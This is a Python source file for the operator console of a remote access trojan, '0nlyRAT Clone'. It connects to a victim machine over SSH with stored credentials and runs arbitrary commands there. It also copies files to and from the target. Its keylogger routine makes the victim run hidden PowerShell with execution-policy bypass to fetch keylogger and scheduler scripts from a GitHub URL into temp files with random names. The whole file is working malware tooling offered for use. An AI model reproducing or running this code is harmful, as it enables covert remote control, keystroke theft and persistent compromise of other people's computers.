#!/usr/bin/python
# python console for the RAT to interact with target pc

import os
import sys
import getpass
import string
import secrets as s
import random as r

banner = r"""
  /$$$$$$            /$$           /$$$$$$$   /$$$$$$  /$$$$$$$$
 /$$$_  $$          | $$          | $$__  $$ /$$__  $$|__  $$__/
| $$$$\ $$ /$$$$$$$ | $$ /$$   /$$| $$  \ $$| $$  \ $$   | $$   
| $$ $$ $$| $$__  $$| $$| $$  | $$| $$$$$$$/| $$$$$$$$   | $$   
| $$\ $$$$| $$  \ $$| $$| $$  | $$| $$__  $$| $$__  $$   | $$   
| $$ \ $$$| $$  | $$| $$| $$  | $$| $$  \ $$| $$  | $$   | $$   
|  $$$$$$/| $$  | $$| $$|  $$$$$$$| $$  | $$| $$  | $$   | $$   
 \______/ |__/  |__/|__/ \____  $$|__/  |__/|__/  |__/   |__/   
                         /$$  | $$                              
                        |  $$$$$$/                              
                         \______/                               
 
                
            [::] The Famous 0nlyRAT Clone Project :) [::]
"""

help_menu = """
            [::] 0nlyRAT help menu [::]

            [+] Arguments:                                   
                [*] <config file> with extension (.rat)
                [*] -h or --help    for help
                [*] -u or --update  for update
                [*] -r or --remove  for uninstall
            
"""

options_menu = """
            [+] command and control:
                [0] Remote Console
                [1] Keylogger       (not done yet)
                [2] remote download (not done yet) 
                [3] remote upload   (not done yet) 
                [4] remote command  (not done yet)

            [+] Options:
                [-h] or [--help]     ---   help
                [-u] or [--update]   ---   update
                [-r] or [--remove]   ---   remove


            * any other commands will be a default
              terminal command
"""

username = getpass.getuser()
header = f"[~] {username}@onlyrat $ "
remote_path = "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads"
local_path = f"/home/{username}/.0nlyRAT" if username!="root" else "/root/.0nlyRAT"

IP_KEY = "IPADDRESS"
PASS_KEY = "PASSWORD"
TEMPDIR_KEY = "TEMPDIR"
STARTUPDIR_KEY = "STARTUPDIR"

def read_config(config_file):
    if not os.path.exists(config_file):
        raise FileNotFoundError
    configuration = {}
    read_lines = open(config_file, "r").readlines()
    configuration[IP_KEY] = read_lines[0].strip()
    configuration[PASS_KEY] = read_lines[1].strip()
    configuration[TEMPDIR_KEY] = read_lines[2].replace("\\","/").strip()
    configuration[STARTUPDIR_KEY] = read_lines[3].replace("\\","/").strip()
    return configuration

# remotely connect to target
def connect(ipv4,pword):
    os.system(f"sshpass -p \"{pword}\" ssh onlyrat@{ipv4}")

def exit():
    print("[*] exiting...")
    sys.exit(1)

def clear():
    os.system("clear")

def os_detection():
    if os.name == "nt":
        return "w"
    if os.name == "posix":
        return "l"
    
def random_text():
    return ''.join(s.choice(string.ascii_letters+string.digits) for _ in range(r.randint(8,17)))

# scp upload
def remote_upload(ipv4,pword,file_path,upload_path):
    os.system(f"sshpass -p \"{pword}\" scp {file_path} onlyrat@{ipv4}:{upload_path}")

# scp download
def remote_download(ipv4,pword,path_to_file,local_download_location):
    os.system(f"sshpass -p \"{pword}\" scp onlyrat@{ipv4}:{path_to_file} {local_download_location}")

def remote_command(ipv4,pword,command):
    c = f"sshpass -p \'{pword}\' ssh onlyrat@{ipv4} '{command}'"
    print(c)
    os.system(c)

def keylogger(ipv4,pword,temp_path,startup_path):
    print("[+] Initializing keylogger....")
    keylogger_command = f"powershell.exe -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/keylogger/keylogger.ps1 -outfile {temp_path}/XukhovfGQPLEcYwZ.ps1\""
    scheduler_command = f"powershell.exe -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/keylogger/scheduler.ps1 -outfile {temp_path}/QbaHnRAlojyG.ps1\""
    print("[+] keylogger prepared. Ready to download....")
    print("[+] Initializing keylogger.....")
    # print(keylogger_command,'\n\n',scheduler_command,'\n\n',controller_command,'\n\n')
    remote_command(ipv4,pword,keylogger_command)
    print("[+] Initializing scheduler.....")
    remote_command(ipv4,pword,scheduler_command)
    #print("[+] Initializing  controller.....")
    #remote_command(ipv4,pword,controller_command)
    print("[*] keylogger installed successfully")

def update():
    return

def remove():
    return

# command line interface
def cli(arguments):
    clear()
    print(banner)
    if arguments:
        argument = sys.argv[1]
        if argument.endswith(".rat"):
            try:
                configuration = read_config(argument)
            except FileNotFoundError:
                print(f"\nError: Config file '{argument}' does not exist.\n")
                exit()
            tgt_ipv4 = configuration.get(IP_KEY)
            tgt_pword = configuration.get(PASS_KEY)
            tgt_td = configuration.get(TEMPDIR_KEY)
            tgt_sd = configuration.get(STARTUPDIR_KEY)
            print(options_menu)
            print("\t    [*] type \"help\" for help menu [*]\n")
            while True:
                option = input(f"{header}")
                if option == "0":
                    connect(tgt_ipv4,tgt_pword)
                elif option == "1":
                    keylogger(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                elif option == "help":
                    clear()
                    print(banner)
                    print(options_menu)
                elif option in ["quit", "exit", "e", "q"]:
                    exit()
                else:
                    os.system(option)
                print("\n")
        elif argument in ["-h","--help"]:
            print(help_menu)
        elif argument in ["-u","--update"]:
            update()
        elif argument in ["-r","--remove","--uninstall"]:
            remove()
        else:
            print("[*] Can't interpret command")
    else:
        print(help_menu)

def main():
    clear()
    # checks for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    except Exception:
        arguments_exist = False
    else:
        arguments_exist = True
    # run commandline interface
    cli(arguments_exist)

if __name__ == "__main__":
    main()